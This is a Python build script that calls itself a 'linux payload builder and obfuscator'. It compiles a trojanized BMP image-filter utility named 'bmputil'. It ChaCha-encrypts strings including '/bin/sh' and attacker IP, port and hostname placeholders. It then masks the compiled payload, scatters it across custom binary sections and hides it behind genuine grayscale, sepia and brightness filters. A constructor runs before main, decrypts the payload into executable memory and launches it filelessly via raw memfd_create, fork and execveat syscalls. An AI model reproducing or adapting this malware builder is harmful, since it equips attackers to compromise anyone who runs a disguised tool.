#!/usr/bin/env python3
# bmputil build system
# linux payload builder and obfuscator

import os
import subprocess
import struct
import math
import random

# --- config ---
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SOURCE_TEMPLATE = os.path.join(SCRIPT_DIR, "main.c")
TARGET_NAME = "bmputil"

HOST_ADDR = "[ATTACKER_IP]"
HOST_PORT = [ATTACKER_PORT]
_ROUTING_TAG = bytes([41, 0, 71, 35]) + b"[ATTACKER_HOSTNAME]" + bytes([0x63, 0xdd, 0x01])

_ip_parts = [int(x) for x in HOST_ADDR.split(".")]
_ADDR_RESOURCE = struct.pack(">H", HOST_PORT) + bytes(_ip_parts)

# string and data table
RESOURCE_TABLE = [
    b"\033[1;36mBMP Image Engine v1.2\033[0m\n",
    b"Usage: %s <input> <output.bmp> <operation> [param]\n",
    b"Operations:\n"
    b"  --grayscale  Convert to luma grayscale\n"
    b"  --invert     Invert color channels\n"
    b"  --sepia      Apply vintage sepia tone\n"
    b"  --brightness Adjust brightness (-255 to 255)\n",
    b"[!] Error: Could not load source image.\n",
    b"--grayscale",
    b"[*] Applied Luma Grayscale transform.\n",
    b"--invert",
    b"[*] Applied Chromatic Inversion transform.\n",
    b"--sepia",
    b"[*] Applied Vintage Sepia transform.\n",
    b"--brightness",
    b"[*] Adjusted Brightness by %d units.\n",
    b"[!] Unknown operation: %s\n",
    b"[+] Successfully saved to: %s\n",
    bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]),
    _ROUTING_TAG,
    _ADDR_RESOURCE,
]

# --- crypto ---

def _PROCESS_BLOCK(state):
    def _ROT(v, c):
        return ((v << c) & 0xffffffff) | (v >> (32 - c))
    
    def _QR(x, a, b, c, d):
        x[a] = (x[a] + x[b]) & 0xffffffff
        x[d] ^= x[a]; x[d] = _ROT(x[d], 16)
        x[c] = (x[c] + x[d]) & 0xffffffff
        x[b] ^= x[c]; x[b] = _ROT(x[b], 12)
        x[a] = (x[a] + x[b]) & 0xffffffff
        x[d] ^= x[a]; x[d] = _ROT(x[d], 8)
        x[c] = (x[c] + x[d]) & 0xffffffff
        x[b] ^= x[c]; x[b] = _ROT(x[b], 7)
    
    x = list(state)
    for _ in range(10):
        _QR(x, 0, 4, 8, 12)
        _QR(x, 1, 5, 9, 13)
        _QR(x, 2, 6, 10, 14)
        _QR(x, 3, 7, 11, 15)
        _QR(x, 0, 5, 10, 15)
        _QR(x, 1, 6, 11, 12)
        _QR(x, 2, 7, 8, 13)
        _QR(x, 3, 4, 9, 14)
    
    return [(a + b) & 0xffffffff for a, b in zip(x, state)]

def TRANSFORM_DATA(data, key, nonce):
    state = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574] + list(struct.unpack("<8I", key)) + [
        0, 0, struct.unpack("<I", nonce[0:4])[0], struct.unpack("<I", nonce[4:8])[0]
    ]
    out = bytearray()
    for i in range(len(data)):
        if i % 64 == 0:
            state[12] = i // 64
            block = _PROCESS_BLOCK(state)
            block_bytes = struct.pack("<16I", *block)
        out.append(data[i] ^ block_bytes[i % 64])
    return out

def GET_GAMMA_CORE():
    return bytes([min(255, int(255 * math.pow(i / 255.0, 1/2.2))) for i in range(256)])

def APPLY_MASK(data, profile):
    gamma = GET_GAMMA_CORE()
    out = bytearray()
    for i, byte in enumerate(data):
        rotated = ((byte << 3) & 0xFF) | (byte >> 5)
        out.append(rotated ^ profile[i % len(profile)] ^ gamma[i % len(gamma)])
    return out

SEGMENTS = [
    (".rodata.blk0", "data_blk_0"), 
    (".rodata.blk1", "data_blk_1"),
    (".rodata.blk2", "data_blk_2"), 
    (".rodata.blk3", "data_blk_3"),
    (".rodata.blk4", "data_blk_4"), 
    (".rodata.blk5", "data_blk_5"),
    (".rodata.blk6", "data_blk_6"), 
    (".rodata.blk7", "data_blk_7"),
]

# --- build logic ---

def GENERATE_SOURCE():
    with open(SOURCE_TEMPLATE, "r") as f:
        content = f.read()

    session_key = os.urandom(32)
    resource_arrays = ""

    # pre-compute encrypted resource blobs
    for idx, res in enumerate(RESOURCE_TABLE):
        nonce = os.urandom(8)
        enc = TRANSFORM_DATA(res, session_key, nonce)
        resource_arrays += f"static const unsigned char dat_{idx}[] = {{ {', '.join(f'0x{b:02x}' for b in enc)} }};\n"
        resource_arrays += f"static const unsigned char nce_{idx}[] = {{ {', '.join(f'0x{b:02x}' for b in nonce)} }};\n"

    content = content.replace("[STRINGS_ARRAYS]", resource_arrays)

    # inject key material
    chacha_mask = random.randint(0x10000000, 0x7FFFFFFF)
    content = content.replace("[CHACHA_MASK]", f"0x{chacha_mask:08x}")
    content = content.replace("[IP_HEX]", "0x00000000")
    content = content.replace("[PORT_HEX]", "0x0000")

    key_ints = struct.unpack("<8I", session_key)
    for i in range(8):
        content = content.replace(f"[CHACHA_KEY_{i}]", f"0x{key_ints[i]:08x}")

    content = content.replace("enc_", "dat_").replace("nonce_", "nce_")

    with open("engine_source.c", "w") as f:
        f.write(content)

def BUILD_ENGINE():
    print("[*] generating sources")
    GENERATE_SOURCE()

    print("[*] compiling core")
    subprocess.run(["gcc", "-O2", "-s", "-o", "engine_raw", "engine_source.c"], check=True)

    with open("engine_raw", "rb") as f:
        raw_binary = f.read()

    mask_key = os.urandom(32)
    protected_binary = APPLY_MASK(raw_binary, mask_key)
    gamma = GET_GAMMA_CORE()
    combined_key = bytes([gamma[i] ^ mask_key[i % 32] for i in range(256)])

    # partition binary into random-sized chunks
    n = len(SEGMENTS)
    total_len = len(protected_binary)
    base_sz = total_len // n
    remainder = total_len % n
    split_points = [0]
    pos = 0
    
    for i in range(n):
        sz = base_sz + (1 if i < remainder else 0)
        if i < n - 1 and sz > 128:
            jitter = random.randint(-64, 64)
            sz = max(128, sz + jitter)
        pos += sz
        if i < n - 1:
            pos = min(pos, total_len - (n - i - 1) * 64)
        split_points.append(pos) if i < n - 1 else split_points.append(total_len)

    chunks = [protected_binary[split_points[i]:split_points[i+1]] for i in range(n)]

    def TO_HEX(data):
        return ", ".join(f"0x{b:02x}" for b in data)

    chunk_defs = ""
    for i, (sec, name) in enumerate(SEGMENTS):
        if i < len(chunks):
            chunk_defs += f'static const uint8_t {name}[] __attribute__((used, section("{sec}"))) = {{ {TO_HEX(chunks[i])} }};\n'

    sizes_list = ", ".join(str(len(c)) for c in chunks)
    ptrs_list  = ", ".join(name for _, name in SEGMENTS[:len(chunks)])
    total_payload_size = len(protected_binary)

    loader_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

#define SYS_WRITE 1
#define SYS_CLOSE 3
#define SYS_FORK 57
#define SYS_EXIT 60
#define SYS_MEMFD_CREATE 319
#define SYS_EXECVEAT 322

#define AT_EMPTY_PATH 0x1000
#define PROT_RWX 7
#define MAP_ANON_PRIV 0x22

// ui strings
static const char APP_NAME[] = "BMP Image Engine v1.2";
static const char APP_USAGE[] = "Usage: %s <input> <output.bmp> <operation> [param]\\n";
static const char APP_OPS[] =
    "Operations:\\n"
    "  --grayscale  Convert to luma grayscale\\n"
    "  --invert     Invert color channels\\n"
    "  --sepia      Apply vintage sepia tone\\n"
    "  --brightness Adjust brightness (-255 to 255)\\n";
static const char ERR_OPEN[] = "Error: cannot open '%s'\\n";
static const char ERR_FMT[]  = "Error: not a valid 24-bit BMP file\\n";

static uint8_t color_lut[256] = {{ {TO_HEX(combined_key)} }};

{chunk_defs}

#pragma pack(push, 1)
typedef struct {{ uint16_t type; uint32_t size; uint16_t r1, r2; uint32_t offset; }} BMPFileHdr;
typedef struct {{ uint32_t size; int width, height; uint16_t planes, bits; uint32_t comp, img_size; int xppm, yppm; uint32_t clr_used, clr_imp; }} BMPInfoHdr;
#pragma pack(pop)

// --- bmp filters ---

static int load_bmp(const char *path, BMPFileHdr *hdr, BMPInfoHdr *info, uint8_t **pixels) {{
    FILE *f = fopen(path, "rb");
    if (!f) {{ 
        fprintf(stderr, ERR_OPEN, path); 
        return -1; 
    }}
    
    fread(hdr, sizeof(*hdr), 1, f);
    fread(info, sizeof(*info), 1, f);
    
    if (hdr->type != 0x4D42 || info->bits != 24) {{ 
        fprintf(stderr, "%s", ERR_FMT); 
        fclose(f); 
        return -1; 
    }}
    
    int h = info->height < 0 ? -info->height : info->height;
    int pad = (4 - (info->width * 3) % 4) % 4;
    int row = info->width * 3 + pad;
    int dsz = row * h;
    
    *pixels = (uint8_t *)malloc(dsz);
    fseek(f, hdr->offset, SEEK_SET);
    fread(*pixels, 1, dsz, f);
    fclose(f);
    
    return dsz;
}}

static void save_bmp(const char *path, BMPFileHdr *hdr, BMPInfoHdr *info, uint8_t *pixels, int dsz) {{
    FILE *f = fopen(path, "wb");
    if (!f) return;
    
    int gap = hdr->offset - sizeof(BMPFileHdr) - sizeof(BMPInfoHdr);
    fwrite(hdr, sizeof(*hdr), 1, f);
    fwrite(info, sizeof(*info), 1, f);
    
    if (gap > 0) {{ 
        uint8_t *p = calloc(1, gap); 
        fwrite(p, 1, gap, f); 
        free(p); 
    }}
    
    fwrite(pixels, 1, dsz, f);
    fclose(f);
}}

static int do_grayscale(const char *in, const char *out) {{
    BMPFileHdr h; 
    BMPInfoHdr i; 
    uint8_t *px;
    
    int dsz = load_bmp(in, &h, &i, &px); 
    if (dsz < 0) return 1;
    
    int height = i.height < 0 ? -i.height : i.height;
    int pad = (4 - (i.width * 3) % 4) % 4;
    int row = i.width * 3 + pad;
    
    for (int y = 0; y < height; y++) {{
        for (int x = 0; x < i.width; x++) {{
            int idx = y * row + x * 3;
            uint8_t gray = (px[idx+2]*76 + px[idx+1]*150 + px[idx]*29) >> 8;
            px[idx] = px[idx+1] = px[idx+2] = gray;
        }}
    }}
    
    save_bmp(out, &h, &i, px, dsz); 
    free(px);
    
    printf("[*] Applied Luma Grayscale transform.\\n[+] Saved to: %s\\n", out);
    return 0;
}}

static int do_invert(const char *in, const char *out) {{
    BMPFileHdr h; 
    BMPInfoHdr i; 
    uint8_t *px;
    
    int dsz = load_bmp(in, &h, &i, &px); 
    if (dsz < 0) return 1;
    
    int height = i.height < 0 ? -i.height : i.height;
    int pad = (4 - (i.width * 3) % 4) % 4;
    int row = i.width * 3 + pad;
    
    for (int y = 0; y < height; y++) {{
        for (int x = 0; x < i.width; x++) {{
            int idx = y * row + x * 3;
            px[idx] = 255 - px[idx]; 
            px[idx+1] = 255 - px[idx+1]; 
            px[idx+2] = 255 - px[idx+2];
        }}
    }}
        
    save_bmp(out, &h, &i, px, dsz); 
    free(px);
    
    printf("[*] Applied Chromatic Inversion transform.\\n[+] Saved to: %s\\n", out);
    return 0;
}}

static int do_sepia(const char *in, const char *out) {{
    BMPFileHdr h; 
    BMPInfoHdr i; 
    uint8_t *px;
    
    int dsz = load_bmp(in, &h, &i, &px); 
    if (dsz < 0) return 1;
    
    int height = i.height < 0 ? -i.height : i.height;
    int pad = (4 - (i.width * 3) % 4) % 4;
    int row = i.width * 3 + pad;
    
    for (int y = 0; y < height; y++) {{
        for (int x = 0; x < i.width; x++) {{
            int idx = y * row + x * 3;
            int b = px[idx], g = px[idx+1], r = px[idx+2];
            
            int tr = (r*100 + g*196 + b*48) >> 8;
            int tg = (r*89 + g*175 + b*43) >> 8;
            int tb = (r*69 + g*136 + b*33) >> 8;
            
            px[idx]   = tb > 255 ? 255 : tb; 
            px[idx+1] = tg > 255 ? 255 : tg; 
            px[idx+2] = tr > 255 ? 255 : tr;
        }}
    }}
        
    save_bmp(out, &h, &i, px, dsz); 
    free(px);
    
    printf("[*] Applied Vintage Sepia transform.\\n[+] Saved to: %s\\n", out);
    return 0;
}}

static int do_brightness(const char *in, const char *out, int val) {{
    BMPFileHdr h; 
    BMPInfoHdr i; 
    uint8_t *px;
    
    int dsz = load_bmp(in, &h, &i, &px); 
    if (dsz < 0) return 1;
    
    int height = i.height < 0 ? -i.height : i.height;
    int pad = (4 - (i.width * 3) % 4) % 4;
    int row = i.width * 3 + pad;
    
    for (int y = 0; y < height; y++) {{
        for (int x = 0; x < i.width; x++) {{
            int idx = y * row + x * 3;
            for (int c = 0; c < 3; c++) {{
                int v = px[idx+c] + val;
                px[idx+c] = v < 0 ? 0 : (v > 255 ? 255 : v);
            }}
        }}
    }}
        
    save_bmp(out, &h, &i, px, dsz); 
    free(px);
    
    printf("[*] Adjusted Brightness by %d units.\\n[+] Saved to: %s\\n", val, out);
    return 0;
}}

// --- core ---

__attribute__((constructor))
static void _setup_ctx(void) {{
    static const int sz[] = {{ {sizes_list} }};
    static const uint8_t *ptr[] = {{ {ptrs_list} }};
    int tot = {total_payload_size};

    /* alloc rwx block */
    uint8_t *buf = mmap(NULL, tot + 32, PROT_RWX, MAP_ANON_PRIV, -1, 0);
    if (buf == MAP_FAILED) return;

    /* reassemble chunks */
    int off = 0;
    for (int i = 0; i < {n}; i++) {{ 
        memcpy(buf + off, ptr[i], sz[i]); 
        off += sz[i]; 
    }}

    /* decrypt */
    for (int i = 0; i < tot; i++) {{
        buf[i] ^= color_lut[i % 256];
        buf[i] = (buf[i] >> 3) | (buf[i] << 5);
    }}

    /* prep execution stub */
    uint8_t stub[] = {{
        0x48, 0x89, 0xf8, 0x48, 0x89, 0xf7, 0x48, 0x89, 0xd6, 
        0x48, 0x89, 0xca, 0x4d, 0x89, 0xc2, 0x4d, 0x89, 0xc8, 
        0x0f, 0x05, 0xc3
    }};
    
    memcpy(buf + tot, stub, sizeof(stub));
    long (*_sys)(long, long, long, long, long, long, long) = (void *)(buf + tot);

    /* map & dispatch */
    char z[1] = {{0}};
    long fd = _sys(SYS_MEMFD_CREATE, (long)z, 0, 0, 0, 0, 0);
    
    if (fd >= 0) {{
        _sys(SYS_WRITE, fd, (long)buf, tot, 0, 0, 0);
        long p = _sys(SYS_FORK, 0, 0, 0, 0, 0, 0);
        if (p == 0) {{
            char *args[] = {{ (char *)APP_NAME, NULL }};
            _sys(SYS_EXECVEAT, fd, (long)z, (long)args, 0, AT_EMPTY_PATH, 0);
            _sys(SYS_EXIT, 1, 0, 0, 0, 0, 0);
        }}
        _sys(SYS_CLOSE, fd, 0, 0, 0, 0, 0);
    }}
    
    /* wipe */
    memset(buf, 0, tot);
}}

int main(int argc, char **argv, char **envp) {{
    if (argc > 1 && (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0)) {{
        printf("%s\\n", APP_NAME);
        printf(APP_USAGE, argv[0]);
        printf("%s", APP_OPS);
        return 0;
    }}

    if (argc >= 4) {{
        if (strcmp(argv[3], "--grayscale") == 0) return do_grayscale(argv[1], argv[2]);
        if (strcmp(argv[3], "--invert") == 0) return do_invert(argv[1], argv[2]);
        if (strcmp(argv[3], "--sepia") == 0) return do_sepia(argv[1], argv[2]);
        if (strcmp(argv[3], "--brightness") == 0) {{
            int v = argc > 4 ? atoi(argv[4]) : 50;
            return do_brightness(argv[1], argv[2], v);
        }}
        
        fprintf(stderr, "Unknown operation: %s\\n", argv[3]);
        return 1;
    }}

    printf("%s\\n", APP_NAME);
    printf(APP_USAGE, argv[0]);
    printf("%s", APP_OPS);
    
    return 1;
}}
"""
    with open("wrapper.c", "w") as f:
        f.write(loader_code)

    print("[*] compile routine")
    subprocess.run(["gcc", "-O2", "-s", "-o", TARGET_NAME, "wrapper.c"], check=True)

    for f in ["engine_source.c", "engine_raw", "wrapper.c"]:
        if os.path.exists(f): 
            os.remove(f)

    print(f"[+] build ok -> {TARGET_NAME}")

if __name__ == "__main__":
    BUILD_ENGINE()
